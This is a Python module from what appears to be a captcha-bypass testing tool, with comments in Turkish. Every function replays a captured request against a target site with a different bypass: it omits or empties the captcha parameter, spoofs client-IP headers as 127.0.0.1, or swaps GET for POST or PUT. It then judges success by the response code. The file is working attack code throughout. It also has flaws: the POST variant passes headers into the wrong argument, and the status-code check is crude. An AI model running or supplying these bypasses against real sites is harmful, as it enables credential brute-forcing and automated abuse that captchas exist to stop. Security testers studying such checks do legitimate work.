import requests as r
from utils.parser import parse_req_headers, list_to_dict
from core.findtoken import find_token
from utils.argparser import get_arguments

def bypass_method_1_get(url: str, req: str, token = None):
    # GET olan isteklerde captcha parametresini göndermeyerek bypass etmeye çalışır.
    headers = parse_req_headers(req)
    args = get_arguments()
    if token == None:
        token = find_token(req)
        if not token:
            return 0
    form_data = list_to_dict(req)
    response = r.get(url, params=form_data, headers=headers)
    print("Trying Captcha param None method..")
    try:
        for key in form_data:
            if key == token:
                del form_data[key]
                break

        new_response = r.get(url, params=form_data, headers=headers)
        if "40" not in str(response.status_code) and "50" not in str(response.status_code) and response.status_code == new_response.status_code:
            if args.error:
                if args.error not in new_response.text:
                    return 1
                else:
                    return 0
            else:
                return 1
        else:
            return 0

    except r.exceptions.HTTPError as e:
        print("Http Error:", e)
    except r.exceptions.ConnectionError as e:
        print("Error Connecting:", e)
    except r.exceptions.Timeout as e:
        print("Timeout Error:", e)
    except r.exceptions.RequestException as e:
        print("OOps: Something Else", e)
    except Exception as e:
        print("Error! ", e)
def bypass_method_2_get(url: str, req: str, token = None):
    # GET olan isteklerde captcha parametresini boş göndererek bypass etmeye çalışır.
    headers = parse_req_headers(req)
    args = get_arguments()
    if token == None:
        token = find_token(req)
        if not token:
            return 0
    form_data = list_to_dict(req)
    response = r.get(url, params=form_data, headers=headers)
    print("Trying Captcha param Null method..")
    try:
        for key in form_data:
            if key == token:
                form_data[key] = ""
                break

        new_response = r.get(url, params=form_data, headers=headers)
        if "40" not in str(response.status_code) and "50" not in str(response.status_code) and response.status_code == new_response.status_code:
            if args.error:
                if args.error not in new_response.text:
                    return 1
                else:
                    return 0
            else:
                return 1
        else:
            return 0
    except r.exceptions.HTTPError as e:
        print("Http Error:", e)
    except r.exceptions.ConnectionError as e:
        print("Error Connecting:", e)
    except r.exceptions.Timeout as e:
        print("Timeout Error:", e)
    except r.exceptions.RequestException as e:
        print("OOps: Something Else", e)
    except Exception as e:
        print("Error! ", e)
def bypass_method_3_get(url: str, req: str, token = None):
    # GET olan isteklerde Headerlar kullanılarak bypass etmeye çalışır.
    headers = parse_req_headers(req)
    args = get_arguments()
    if token == None:
        token = find_token(req)
        if not token:
            return 0
    form_data = list_to_dict(req)
    response = r.get(url, params=form_data, headers=headers)

    headers["X-Forwarded-Host"] = "127.0.0.1"
    headers["X-Forwarded-For"] = "127.0.0.1"
    headers["X-Originating-IP"] = "127.0.0.1"
    headers["X-Remote-IP"] = "127.0.0.1"
    headers["X-Remote-Addr"] = "127.0.0.1"
    headers["X-Client-IP"] = "127.0.0.1"
    headers["X-Host"] = "127.0.0.1"

    print("Trying Add Header method..")
    try:
        new_response = r.get(url, params=form_data, headers=headers)
        if "40" not in str(response.status_code) and "50" not in str(response.status_code) and response.status_code == new_response.status_code:
            if args.error:
                if args.error not in new_response.text:
                    return 1
                else:
                    return 0
            else:
                return 1
        else:
            return 0

    except r.exceptions.HTTPError as e:
        print("Http Error:", e)
    except r.exceptions.ConnectionError as e:
        print("Error Connecting:", e)
    except r.exceptions.Timeout as e:
        print("Timeout Error:", e)
    except r.exceptions.RequestException as e:
        print("OOps: Something Else", e)
    except Exception as e:
        print("Error! ", e)
def bypass_method_4_post(url: str, req: str, token = None):
    # GET olan isteklerde GET -> POST ile bypass etmeye çalışır.
    headers = parse_req_headers(req)
    args = get_arguments()
    if token == None:
        token = find_token(req)
        if not token:
            return 0
    form_data = list_to_dict(req)
    response = r.get(url, params=form_data, headers=headers)

    print("Trying POST->GET/GET->POST method..")
    try:
        new_response = r.post(url, form_data, headers)
        if "40" not in str(response.status_code) and "50" not in str(response.status_code) and response.status_code == new_response.status_code:
            if args.error:
                if args.error not in new_response.text:
                    return 1
                else:
                    return 0
            else:
                return 1
        else:
            return 0

    except r.exceptions.HTTPError as e:
        print("Http Error:", e)
    except r.exceptions.ConnectionError as e:
        print("Error Connecting:", e)
    except r.exceptions.Timeout as e:
        print("Timeout Error:", e)
    except r.exceptions.RequestException as e:
        print("OOps: Something Else", e)
    except Exception as e:
        print("Error! ", e)
def bypass_method_4_put(url: str, req: str, token = None):
    # GET olan isteklerde GET -> PUT ile bypass etmeye çalışır.
    headers = parse_req_headers(req)
    args = get_arguments()
    if token == None:
        token = find_token(req)
        if not token:
            return 0
    form_data = list_to_dict(req)
    response = r.get(url, params=form_data, headers=headers)

    print("Trying POST->PUT/GET->PUT method..")
    try:
        new_response = r.put(url, data=form_data, headers=headers)
        if "40" not in str(response.status_code) and "50" not in str(response.status_code) and response.status_code == new_response.status_code:
            if args.error:
                if args.error not in new_response.text:
                    return 1
                else:
                    return 0
            else:
                return 1
        else:
            return 0

    except r.exceptions.HTTPError as e:
        print("Http Error:", e)
    except r.exceptions.ConnectionError as e:
        print("Error Connecting:", e)
    except r.exceptions.Timeout as e:
        print("Timeout Error:", e)
    except r.exceptions.RequestException as e:
        print("OOps: Something Else", e)
    except Exception as e:
        print("Error! ", e)